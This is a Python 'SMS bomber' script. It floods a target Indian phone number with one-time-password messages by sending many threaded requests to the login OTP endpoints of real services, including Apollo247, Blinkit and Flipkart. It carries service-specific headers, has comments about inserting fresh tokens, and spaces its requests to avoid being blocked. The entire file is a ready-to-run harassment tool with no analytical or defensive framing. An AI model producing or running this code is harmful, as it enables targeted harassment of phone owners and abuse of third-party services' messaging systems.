import requests
import os
import time
import threading

# --- COLORS ---
G = "\033[92m" # Green
R = "\033[91m" # Red
Y = "\033[93m" # Yellow
W = "\033[0m"  # White

success_count = 0
failed_count = 0

# ---------------------------------------------------------
# API DATABASE (Added Mamaearth, Apollo, Blinkit)
# ---------------------------------------------------------
SMS_APIS = [
    {
        "name": "Mamaearth_Gokwik",
        "method": "POST",
        "url": "https://gkx.gokwik.co/kp/api/v1/auth/otp/send",
        "json": {"phone": "{target}", "country": "in", "country_code": "+91"},
        "headers": {"Gk-Merchant-Id": "12wyqc26spoknx0kv7t", "Origin": "https://mamaearth.in"}
    },
    {
        "name": "Apollo247",
        "method": "POST",
        "url": "https://apigateway.apollo247.in/auth-service/generateOtp",
        "json": {"loginType": "PATIENT", "mobileNumber": "+91{target}"},
        "headers": {"X-Apollo-Pre-Auth-Key": "eyJHbGciOiJIUzI1NiJ9..."} # <-- Yahan naya token dalein
    },
    {
        "name": "Blinkit",
        "method": "POST",
        "url": "https://blinkit.com/v1/user/otp/send",
        "json": {"phone": "{target}"},
        "headers": {"app_client": "consumer_web", "Origin": "https://blinkit.com"}
    },
    {
        "name": "Housing", 
        "method": "POST", 
        "url": "https://login.housing.com/api/v2/send-otp", 
        "json": {"phone": "{target}"}
    },
    {
        "name": "ConfirmTkt", 
        "method": "GET", 
        "url": "https://securedapi.confirmtkt.com/api/platform/register", 
        "params": {"newOtp": "true", "mobileNumber": "{target}"}
    },
    {
        "name": "Flipkart", 
        "method": "POST", 
        "url": "https://rome.api.flipkart.com/api/7/user/otp/generate", 
        "json": {"loginId": "+91{target}"}
    }
]

def send_otp(api, target):
    global success_count, failed_count
    
    # Base Headers
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json"
    }
    
    # Custom Headers update logic
    if "headers" in api:
        headers.update(api["headers"])
    
    try:
        url = api["url"].replace("{target}", target)
        
        # Replacement Logic for JSON
        json_p = None
        if "json" in api:
            json_str = str(api["json"]).replace("{target}", target).replace("'", '"')
            import json
            json_p = json.loads(json_str)

        # Replacement Logic for Params
        params_p = {k: v.replace("{target}", target) if isinstance(v, str) else v for k, v in api.get("params", {}).items()} if "params" in api else None

        if api["method"] == "GET":
            res = requests.get(url, params=params_p, headers=headers, timeout=10)
        else:
            res = requests.post(url, json=json_p, headers=headers, timeout=10)

        # Success Check
        if res.status_code in [200, 201, 202] or "success" in res.text.lower():
            print(f"{G}[SUCCESS]{W} {api['name']} sent OTP to {target}")
            success_count += 1
        else:
            print(f"{R}[FAILED]{W} {api['name']} - Status: {res.status_code}")
            failed_count += 1
            
    except Exception as e:
        print(f"{Y}[ERROR]{W} {api['name']} connection error")
        failed_count += 1

def start_bombing(target, count):
    print(f"\n{Y}[!] Bombing started on {target}...{W}\n")
    threads = []
    
    for i in range(count):
        api = SMS_APIS[i % len(SMS_APIS)] # APIs repeat hongi agar count zyada hai
        t = threading.Thread(target=send_otp, args=(api, target))
        t.start()
        threads.append(t)
        time.sleep(0.2) # Thoda gap taaki server block na kare

    for t in threads:
        t.join()

    print(f"\n{G}--- BOMBING FINISHED ---{W}")
    print(f"{G}Success: {success_count}{W} | {R}Failed: {failed_count}{W}")

if __name__ == "__main__":
    os.system('clear')
    print(f"{Y}--- CUSTOM SMS BOMBER ---{W}")
    target_num = input(f"\n{W}Target Number (Without +91): {G}")
    sms_count = int(input(f"{W}Number of SMS to send: {G}"))
    
    start_bombing(target_num, sms_count)
